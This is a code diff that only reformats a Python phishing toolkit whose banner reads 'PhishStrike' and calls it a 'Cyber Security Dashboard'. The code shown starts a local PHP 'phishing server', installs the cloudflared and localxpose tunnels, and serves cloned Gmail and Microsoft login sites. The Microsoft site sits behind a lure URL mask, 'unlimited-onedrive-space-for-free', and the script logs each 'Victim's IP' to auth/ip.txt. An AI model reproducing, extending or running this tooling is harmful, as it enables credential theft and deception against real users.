@@ -12,9 +12,9 @@ import tarfile
 import re
 import json
 
-if sys.stdout.encoding != 'utf-8':
+if sys.stdout.encoding != "utf-8":
     try:
-        sys.stdout.reconfigure(encoding='utf-8')
+        sys.stdout.reconfigure(encoding="utf-8")
     except AttributeError:
         pass
 
@@ -24,16 +24,16 @@ HOST = "127.0.0.1"
 PORT = "8080"
 
 # ANSI colors – Cyber Dashboard Bold Theme
-LIGHT1    = "\033[1;38;2;0;255;255m"   # Neon Cyan (Bold)
-LIGHT2    = "\033[1;38;2;30;144;255m"  # Electric Blue (Bold)
-MEDIUM    = "\033[1;38;2;0;102;204m"   # Deep Azure (Bold)
-PURPLE    = "\033[1;38;2;157;0;255m"   # Neon Purple (Bold)
-DARK      = "\033[1;38;2;80;80;80m"     # Graphite (Bold)
-PINK      = "\033[1;38;2;255;45;170m"  # Neon Pink (Bold)
-RED       = "\033[1;38;2;255;50;50m"   # Cyber Red (Bold)
-RESET     = "\033[0m"
-WHITE     = "\033[1;97m"                # Pure White (Bold)
-BOLD      = "\033[1m"
+LIGHT1 = "\033[1;38;2;0;255;255m"  # Neon Cyan (Bold)
+LIGHT2 = "\033[1;38;2;30;144;255m"  # Electric Blue (Bold)
+MEDIUM = "\033[1;38;2;0;102;204m"  # Deep Azure (Bold)
+PURPLE = "\033[1;38;2;157;0;255m"  # Neon Purple (Bold)
+DARK = "\033[1;38;2;80;80;80m"  # Graphite (Bold)
+PINK = "\033[1;38;2;255;45;170m"  # Neon Pink (Bold)
+RED = "\033[1;38;2;255;50;50m"  # Cyber Red (Bold)
+RESET = "\033[0m"
+WHITE = "\033[1;97m"  # Pure White (Bold)
+BOLD = "\033[1m"
 
 
 BASE_DIR = os.path.dirname(os.path.realpath(__file__))
@@ -120,7 +120,8 @@ def check_status():
 
 
 def banner():
-    print(f"""{LIGHT1}  
+    print(
+        f"""{LIGHT1}  
     {LIGHT2} ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
     {LIGHT2} ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
     {LIGHT1} ██████╔╝███████║██║███████╗███████║███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  
@@ -128,7 +129,8 @@ def banner():
     {MEDIUM} ██║     ██║  ██║██║███████║██║  ██║███████║   ██║   ██║  ██║██║██║  ██╗███████╗
     {MEDIUM} ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
     {PURPLE} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    {PURPLE} [{LIGHT1}-{PURPLE}] {PINK}Cyber Security Dashboard | Developed by Farouq Shaheen & Lujain Ghatasheh{RESET}""")
+    {PURPLE} [{LIGHT1}-{PURPLE}] {PINK}Cyber Security Dashboard | Developed by Farouq Shaheen & Lujain Ghatasheh{RESET}"""
+    )
 
 
 def banner_small():
@@ -140,21 +142,29 @@ def banner_small():
 
 def dependencies():
     print(f"\n    {PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Validating environment...")
-    
+
     # Check for PHP (Hard dependency)
     php_path = shutil.which("php") or shutil.which("php.exe")
-    
+
     if php_path is None:
         print(f"\n    {DARK}\x5b{PINK}!{DARK}\x5d{PINK} CRITICAL ERROR: PHP NOT FOUND!")
-        print(f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT2} PHP is required to run the local phishing server.")
-        print(f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT2} Please install PHP and add it to your PATH.")
+        print(
+            f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT2} PHP is required to run the local phishing server."
+        )
+        print(
+            f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT2} Please install PHP and add it to your PATH."
+        )
         if platform.system() != "Windows":
-            print(f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT1} Hint: Run 'sudo apt install php' (for Debian/Ubuntu)")
+            print(
+                f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT1} Hint: Run 'sudo apt install php' (for Debian/Ubuntu)"
+            )
         else:
-            print(f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT1} Download: https://www.php.net/downloads.php")
+            print(
+                f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT1} Download: https://www.php.net/downloads.php"
+            )
         print()
         sys.exit(1)
-    
+
     return php_path
 
 
@@ -189,7 +199,9 @@ def download(url, output):
         if os.path.exists(file_name):
             os.remove(file_name)
     except Exception as e:
-        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Error occurred while downloading {output}.")
+        print(
+            f"\n{DARK}[{WHITE}!{DARK}]{DARK} Error occurred while downloading {output}."
+        )
         reset_color()
         sys.exit(1)
 
@@ -200,7 +212,9 @@ def install_cloudflared():
     ):
         print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{PURPLE} Cloudflared already installed.")
     else:
-        print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Installing Cloudflared...{LIGHT1}")
+        print(
+            f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Installing Cloudflared...{LIGHT1}"
+        )
         arch = platform.machine().lower()
         if platform.system() == "Windows":
             download(
@@ -255,9 +269,7 @@ def install_localxpose():
 def msg_exit():
     os.system("cls" if os.name == "nt" else "clear")
     banner()
-    print(
-        f"\n{PURPLE}{DARK} Thank you for using this tool. Have a good day.{RESET}\n"
-    )
+    print(f"\n{PURPLE}{DARK} Thank you for using this tool. Have a good day.{RESET}\n")
     reset_color()
     sys.exit(0)
 
@@ -282,8 +294,12 @@ def about():
   any misuse of this toolkit !{RESET}
 
 """)
-    print(f"    {DARK}\x5b{WHITE}00{DARK}\x5d{LIGHT2} Main Menu     {DARK}\x5b{WHITE}99{DARK}\x5d{LIGHT2} Exit\n")
-    reply = input(f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD} ")
+    print(
+        f"    {DARK}\x5b{WHITE}00{DARK}\x5d{LIGHT2} Main Menu     {DARK}\x5b{WHITE}99{DARK}\x5d{LIGHT2} Exit\n"
+    )
+    reply = input(
+        f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD} "
+    )
     if reply in ["99"]:
         msg_exit()
     elif reply in ["0", "00"]:
@@ -319,14 +335,18 @@ def cusport():
             banner_small()
             cusport()
     else:
-        print(f"\n\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Using Default Port {PORT}...{LIGHT1}\n")
+        print(
+            f"\n\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Using Default Port {PORT}...{LIGHT1}\n"
+        )
 
 
 def setup_site():
     print(f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{MEDIUM} Setting up server...{LIGHT1}")
     site_dir = os.path.join(".sites", website)
     if not os.path.isdir(site_dir):
-        print(f"\n    {DARK}\x5b{PINK}!{DARK}\x5d{PINK} Error: Site directory {website} not found!")
+        print(
+            f"\n    {DARK}\x5b{PINK}!{DARK}\x5d{PINK} Error: Site directory {website} not found!"
+        )
         return
 
     for item in os.listdir(site_dir):
@@ -336,12 +356,14 @@ def setup_site():
             shutil.copytree(s, d, dirs_exist_ok=True)
         else:
             shutil.copy2(s, d)
-    
+
     shutil.copy2(".sites/ip.php", ".server/www/ip.php")
-    
+
     php_bin = shutil.which("php") or shutil.which("php.exe")
     if not php_bin:
-        print(f"\n    {DARK}\x5b{PINK}!{DARK}\x5d{PINK} PHP binary lost! Re-check your installation.")
+        print(
+            f"\n    {DARK}\x5b{PINK}!{DARK}\x5d{PINK} PHP binary lost! Re-check your installation."
+        )
         sys.exit(1)
 
     print(f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{MEDIUM} Starting PHP server...{LIGHT1}")
@@ -362,7 +384,9 @@ def capture_ip():
             if "IP: " in line:
                 ip = line.split("IP: ")[1].strip()
         print(f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Victim's IP : {WHITE}{ip}")
-        print(f"    {DARK}\x5b{WHITE}-{DARK}\x5d{MEDIUM} Saved in    : {LIGHT2}auth/ip.txt")
+        print(
+            f"    {DARK}\x5b{WHITE}-{DARK}\x5d{MEDIUM} Saved in    : {LIGHT2}auth/ip.txt"
+        )
         with open("auth/ip.txt", "a") as f:
             f.writelines(lines)
 
@@ -743,6 +767,8 @@ def site_gmail():
         os.system("cls" if os.name == "nt" else "clear")
         banner_small()
         site_gmail()
+
+
 def main_menu():
     global website, mask
     os.system("cls" if os.name == "nt" else "clear")
@@ -758,7 +784,9 @@ def main_menu():
 
     {DARK}\x5b{WHITE}99{DARK}\x5d{LIGHT2} About         {DARK}\x5b{WHITE}00{DARK}\x5d{LIGHT2} Exit
     """)
-    reply = input(f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD} ")
+    reply = input(
+        f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD} "
+    )
 
     opts = {
         "4": ("microsoft", "https://unlimited-onedrive-space-for-free"),
@@ -808,4 +836,3 @@ if __name__ == "__main__":
     install_cloudflared()
     install_localxpose()
     main_menu()
-
